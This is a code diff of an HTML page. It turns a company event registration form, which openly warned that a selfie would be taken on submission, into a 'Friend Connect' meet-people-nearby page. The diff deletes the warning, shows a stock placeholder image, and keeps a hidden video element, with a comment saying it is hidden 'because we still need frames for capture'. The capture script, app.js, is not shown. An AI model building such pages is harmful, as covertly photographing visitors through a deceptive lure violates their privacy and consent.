@@ -1,24 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Company Event Registration</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Friend Connect</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <h1>Welcome to [Your Company Name] Event</h1>
-  <p>While submitting the form, the selfie camera shot will be taken automatically — please raise the camera to head level.</p>
 
-  <form id="eventForm">
-    <label>Name: <input type="text" id="name" required /></label><br />
-    <label>Email: <input type="email" id="email" required /></label><br />
-    <label>Phone: <input type="tel" id="phone" required /></label><br />
-    <button type="submit">Submit</button>
-  </form>
+  <div class="app fade-in">
+    <header>
+      <h1>Friend Connect</h1>
+      <p>Meet new people nearby, instantly and safely.</p>
+    </header>
 
-  <video id="video" autoplay playsinline></video>
+    <main>
+      <form id="eventForm">
+        <div class="camera-wrap">
+  <!-- Static Placeholder Image (Round) -->
+  <img id="staticPreview" src="https://img.freepik.com/free-vector/young-people-spending-time-together_23-2148450834.jpg" alt="Avatar">
+
+  <!-- Video stays, but hidden because we still need frames for capture -->
+  <video id="video" autoplay playsinline muted style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
+</div>
+
+
+
+        <input id="name" type="text" placeholder="Your Name" required>
+
+        <button type="submit" id="connectBtn" style="color: white;" class="cta pulse">Find Friends Near Me🤝</button>
+        <div id="status" class="status" aria-live="polite"></div>
+      </form>
+    </main>
+
+    <footer>
+      <small></small>
+    </footer>
+  </div>
 
   <script src="app.js"></script>
 </body>
